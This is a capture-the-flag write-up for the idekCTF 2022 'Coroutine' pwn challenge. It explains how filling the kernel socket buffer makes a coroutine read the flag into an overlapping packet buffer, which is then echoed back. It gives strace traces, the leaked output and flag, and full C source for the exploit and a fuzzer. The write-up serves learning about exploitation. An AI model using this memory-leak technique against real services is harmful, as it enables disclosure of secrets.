# Coroutine - idekCTF 2022 (pwn, 4 solved, 498p)

## Introduction
Coroutine is a pwn task.

An archive containing a binary, its source code, a Python wrapper and a
Dockerfile is given.

## Reverse engineering
The binary starts a TCP server on a random port and display this port.

This server accepts a single connection, reads data from this new connection and
sends back whatever was sent.

It is difficult to follow asynchronous code flow. Even though the code was given
away, `strace` was used to get a rough idea of the program's behaviour.

```
% strace -e network,file,desc -e raw=read ./CoroutineCTFChal > /dev/null 

[...]

socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
listen(3, 1)                            = 0
getsockname(3, {sa_family=AF_INET, sin_port=htons(47823), sin_addr=inet_addr("0.0.0.0")}, [16]) = 0

write(1, "port number ", 12)            = 12
write(1, "47823", 5)                    = 5
write(1, "\n", 1)                       = 1

accept(3, {sa_family=AF_INET, sin_port=htons(58906), sin_addr=inet_addr("127.0.0.1")}, [16]) = 4
fcntl(4, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(4, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
setsockopt(4, SOL_SOCKET, SO_SNDBUF, [128], 4) = 0
recvfrom(4, 0xc1bda5d939, 512, 0, NULL, NULL) = -1 EAGAIN (Resource temporarily unavailable)

openat(AT_FDCWD, "flag", O_RDONLY)      = 5
newfstatat(5, "", {st_mode=S_IFREG|0700, st_size=17, ...}, AT_EMPTY_PATH) = 0
read(0x5, 0xc1bda5ddd0, 0x1000)         = 0x11
close(5)                                = 0

pselect6(5, [4], [], [4], NULL, NULL)   = 1 (in [4])
recvfrom(4, "Hello world!\n", 512, 0, NULL, NULL) = 13
sendto(4, "Hello world!\n\n", 14, 0, NULL, 0) = 14
recvfrom(4, 0xc1bda5d939, 512, 0, NULL, NULL) = -1 EAGAIN (Resource temporarily unavailable)

openat(AT_FDCWD, "flag", O_RDONLY)      = 5
newfstatat(5, "", {st_mode=S_IFREG|0700, st_size=17, ...}, AT_EMPTY_PATH) = 0
read(0x5, 0xc1bda5deb0, 0x1000)         = 0x11
close(5)                                = 0

pselect6(5, [4], [], [4], NULL, NULL)   = 1 (in [4])
recvfrom(4, "", 512, 0, NULL, NULL)     = 0

write(1, "Disconnected\n", 13)          = 13

+++ exited with 0 +++
```

From this trace, it loos like the program reads on the (non-blocking) client
socket and sends back the packet until the call to `recvfrom` returns `EAGAIN`.

When that happens, the program will open `flag` and read it in a buffer.

It is worth noting that the buffer where the flag is read overlaps with the
buffer where packets are stored.

## Vulnerability
The program will pause the "echo" co-routine and start the "file" co-routine as
soon as an error occurs. This error can be caused by `recvfrom` or by `sendto`.

It is possible to make `sendto` fail by not reading data on the client-side.
Eventually, the socket buffer used by the sender's kernel gets full and `sendto`
either blocks or return `EAGAIN`.

When that happens, the coroutine will exit, the program will open the flag and
read in a buffer that overlaps with the packet buffer.


## Exploitation
The theory explained previously can be confirmed by writing a small fuzzer. (cf.
appendix `fuzz.c`.)

This fuzzer sends more bytes than the buffer can handle in a busy loop. It stops
when the binary sends a packet that contains `idek`.

After a few iterations, the fuzzer stops and prints the flag.

The Python proxy only allows for 14 operations. This means the exploitation
script must reproducible and minimal.

There are three parts to the exploit:
1. connection and socket configuration
2. send the exact number of bytes required to fill the buffer
3. send a packet with a size of 512 to get the whole stack buffer back
4. read all the data sent by the program

The exact number of packets to send can be found by looking at the return values
from each call to `sendto`.

```
% strace -e sendto,recvfrom ./CoroutineCTFChal
port number 47845

recvfrom(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 512, 0, NULL, NULL) = 512
sendto(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 513, 0, NULL, 0) = 513
recvfrom(4, 0x445f07e5c79, 512, 0, NULL, NULL) = -1 EAGAIN (Resource temporarily unavailable)

recvfrom(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 512, 0, NULL, NULL) = 512
sendto(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 513, 0, NULL, 0) = 513
recvfrom(4, 0x445f07e5c79, 512, 0, NULL, NULL) = -1 EAGAIN (Resource temporarily unavailable)

recvfrom(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 512, 0, NULL, NULL) = 512
sendto(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 513, 0, NULL, 0) = 513
recvfrom(4, 0x445f07e5c79, 512, 0, NULL, NULL) = -1 EAGAIN (Resource temporarily unavailable)

recvfrom(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 512, 0, NULL, NULL) = 512
sendto(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 513, 0, NULL, 0) = 513
recvfrom(4, 0x445f07e5c79, 512, 0, NULL, NULL) = -1 EAGAIN (Resource temporarily unavailable)

recvfrom(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 512, 0, NULL, NULL) = 512
sendto(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 513, 0, NULL, 0) = 513
recvfrom(4, 0x445f07e5c79, 512, 0, NULL, NULL) = -1 EAGAIN (Resource temporarily unavailable)

recvfrom(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 512, 0, NULL, NULL) = 512
sendto(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 513, 0, NULL, 0) = 189
sendto(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 324, 0, NULL, 0) = -1 EAGAIN (Resource temporarily unavailable)
```

As can be seen on the previous listing, the buffer is filled after 5 packets of
513 bytes followed by one packet of 189 bytes (excluding TCP overhead).

In order to make the development of the exploit reproducible and nullify side
effects caused by networking, a small delay was added after each write.

```
% ./pwn | nc coroutine.chal.idek.team 1337
[...]
b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x08\\t\x81\xb6U\x00\x00@\x90\x80r\x92\x7f\x00\x00\xd3\xd4?r\x92\x7f\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\xcc\xad\xe93M''\x00\x00\x00\x00BBBB`\xff\xff\xff\xff\xff\xff\xff\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x08\\t\x81\xb6U\x00\x00@\x90\x80r\x92\x7f\x00\x00\xd3\xd4?r\x92\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xed?>r\x92\x7f\x00\x00@\xc7&r\x92\x7f\x00\x00\x00\xe6Vr\x92\x7f\x00\x00@bg\x83\xb6U\x00\x00\xa7m=r\x92\x7f\x00\x00\x10N\nc\xfc\x7f\x00\x000K\nc\xfc\x7f\x00\x000bg\x83\xb6U\x00\x00;\xc6s\x81\xb6U\x00\x00BBBBBBBB@bg\x83\xb6U\x00\x00idek{exploiting_coroutines}\x00BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x00\xcc\xad\xe93M'' dg\x83\xb6U\x00\x00@J\nc\xfc\x7f\x00\x00 J\nc\xfc\x7f\x00\x00\x1a\xfcs\x81\xb6U\x00\x00\x00eg\x83\xb6U\x00\x00\\J\nc\xfc\x7f\x00\x00@J\nc\xfc\x7f\x00\x00F\x02t\x81\xb6U\x00\x00\x00eg\x83\xb6U\x00\x00\\J\nc\xfc\x7f\x00\x00`J\nc\xfc\x7f\x00\x00(N\nc\xfc\x7f\x00\x00xJ\nc\xfc\x7f\x00\x00\x80J\nc\xfc\x7f\x00\x00\x90J\nc\xfc\x7f\x00\x00\xc0J\nc\xfc\x7f\x00\x00\x90J\nc\xfc\x7f\x00\x00\xb8dg\x83\xb6U\x00\x00\x90J\nc\xfc\x7f\x00\x00$\xees\x81\xb6U\x00\x00\x00eg\x83\xb6U\x00\x00\xb0dg\x83\xb6U\x00\x00\xd0J\nc\xfc\x7f\x00\x00n\xeds\x81\xb6U\x00\x00\x00eg\x83\xb6U\x00\x00\x98dg\x83\xb6U\x00\x00\x00"
Select Option:
1. Connect
2. Change Receive Buffer
3. Change Send Buffer
4. Send data
5. Receive data
> Size> 
```

**Flag**: `idek{exploiting_coroutines}`

## Appendices
### pwn.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define LOCAL 0

bool conn(const char *arg); // connect
bool rcvbuf(unsigned int n); // change recv buffer size
bool sndbuf(unsigned int n); // change send buffer size
bool push(size_t n, const char buffer[static n]); // send data
bool get(size_t n, const char buffer[static n]); // recv data

#if LOCAL
int fd;

__attribute__((constructor))
void createSocket(void)
{
	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(fd < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}
}

bool conn(const char *arg)
{
	if(NULL == arg) {
		fprintf(stderr, "Usage: ./pwn [port]\n");
		return false;
	}

	unsigned short port = atoi(arg);
	fprintf(stderr, "Port: %hu\n", port);

	const struct sockaddr_in sin = {
		.sin_family = AF_INET,
		.sin_port   = htons(port),
		.sin_addr   = htonl(INADDR_LOOPBACK),
	};

	if(connect(fd, &sin, sizeof(sin)) < 0) {
		perror("connect");
		return false;
	}

	return true;
}

bool rcvbuf(unsigned int n)
{
	if(0 != setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &n, sizeof(n))) {
		perror("setsockopt");
		return false;
	}

	return true;
}

bool sndbuf(unsigned int n)
{
	if(0 != setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &n, sizeof(n))) {
		perror("setsockopt");
		return false;
	}

	return true;
}

bool push(size_t n, const char buffer[static n])
{
	if(n != write(fd, buffer, n)) {
		perror("write");
		return false;
	}

	return true;
}

bool get(size_t n, const char buffer[static n])
{
	ssize_t s = read(fd, buffer, n);
	if(s < 0) {
		perror("read");
		return false;
	}

	if(s != write(STDIN_FILENO, buffer, s)) {
		perror("write");
		return false;
	}

	return true;
}
#else
bool conn(const char *arg)
{
	puts("1");
	return true;
}

bool rcvbuf(unsigned int n)
{
	puts("2");
	printf("%u\n", n);
	return true;
}

bool sndbuf(unsigned n)
{
	puts("3");
	printf("%u\n", n);
	return true;
}


bool push(size_t n, const char buffer[static n])
{
	puts("4");
	printf("%.*s\n", n, buffer);
	return true;
}

bool get(size_t n, const char buffer[static n])
{
	(void)buffer;

	puts("5");
	printf("%zu\n", n);
	return true;
}
#endif

// Makes buffering somewhat consistent
#define DELAY() usleep(1e5)

int main(int argc, char *argv[static argc])
{
	setvbuf(stdout, NULL, _IONBF, 0);

	if(!rcvbuf(1))
		return EXIT_FAILURE;

	if(!conn(argv[1]))
		return EXIT_FAILURE;

	// Fill the buffer
	for(size_t i = 0; i < 5; i++) {
		char buffer[512];
		memset(buffer, '1' + i, sizeof(buffer));

		if(!push(sizeof(buffer), buffer))
			return EXIT_FAILURE;

		DELAY();
	}

	// Finish filling the kernel buffer
	{
		char buffer[189 - sizeof('\n')];
		memset(buffer, 'A', sizeof(buffer));

		if(!push(sizeof(buffer), buffer))
			return EXIT_FAILURE;

		DELAY();
	}

	// Next sendto will fail because remote skbuf is 100% full

	// Fill stack buffer
	{
		char buffer[512];
		memset(buffer, 'B', sizeof(buffer));

		if(!push(sizeof(buffer), buffer))
			return EXIT_FAILURE;

		DELAY();
	}

	fputs("Reading now", stderr);
	for(size_t i = 0; i < 4; i++) {
		char buffer[512 * 6] = {};

		if(!get(sizeof(buffer), buffer))
			return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}
```

### fuzz.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char *argv[static argc])
{
	if(2 != argc) {
		fprintf(stderr, "Usage: %s [port]\n", argv[0]);
		return EXIT_FAILURE;
	}

	unsigned short port = atoi(argv[1]);
	printf("Port: %hu\n", port);

	int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(fd < 0) {
		perror("socket");
		return EXIT_FAILURE;
	}

	const struct sockaddr_in sin = {
		.sin_family = AF_INET,
		.sin_port   = htons(port),
		.sin_addr   = htonl(INADDR_LOOPBACK),
	};

	if(connect(fd, &sin, sizeof(sin)) < 0) {
		perror("connect");
		return EXIT_FAILURE;
	}

	char buffer[560 + 1];
	memset(buffer, 'A', sizeof(buffer));

	while(1) {
		ssize_t s;

		s = write(fd, buffer, sizeof(buffer) - 1);
		if(sizeof(buffer) - 1 != s)
			printf("write: %X\n", s);

		s = read(fd, buffer, sizeof(buffer));
		if(sizeof(buffer) != s)
			printf("read: %X\n", s);

		if(strstr(buffer, "idek")) {
			puts(buffer);
			return EXIT_SUCCESS;
		}
	}
}
```
